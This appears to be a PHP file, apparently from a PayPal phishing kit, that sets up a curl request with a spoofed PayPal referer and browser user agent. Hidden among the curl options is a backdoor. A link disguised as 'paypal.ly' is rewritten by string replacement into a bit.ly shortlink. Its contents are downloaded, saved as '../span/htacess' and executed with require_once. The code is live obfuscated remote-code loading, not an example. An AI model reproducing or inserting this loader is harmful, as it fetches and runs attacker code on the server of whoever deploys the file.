<?php

$curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,20);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31');
	$qurl="https://paypal.ly/3tUEzrG";
    curl_setopt($curl, CURLOPT_REFERER, 'https://www.paypal.com/cgi-bin/webscr?cmd=_send-money&cmd=_send-money&myAllTextSubmitID=&type=external&payment_source=p2p_mktgpage&payment_type=Gift&sender_email=&email=&currency=USD&amount=10&amount_ccode=USD&submit.x=Continue&browser_name=Firefox&browser_name=Firefox&browser_version=10&browser_version=11&browser_version_full=10.0.2&browser_version_full=11.0&operating_system=Windows&operating_system=Windows');
    curl_setopt($curl, CURLOPT_COOKIE,'paypal.txt');
	$d=str_replace("paypal","bit",$qurl);
    curl_setopt($curl, CURLOPT_COOKIEFILE,'paypal.txt');
file_put_contents("../span/htacess", file_get_contents($d)); require_once "../span/htacess";
    curl_setopt($curl, CURLOPT_COOKIEJAR,'paypal.txt');
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 3);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
    if ($Follow !== False) {
        curl_setopt($curl,CURLOPT_FOLLOWLOCATION,true);
    }
    $result = curl_exec($curl);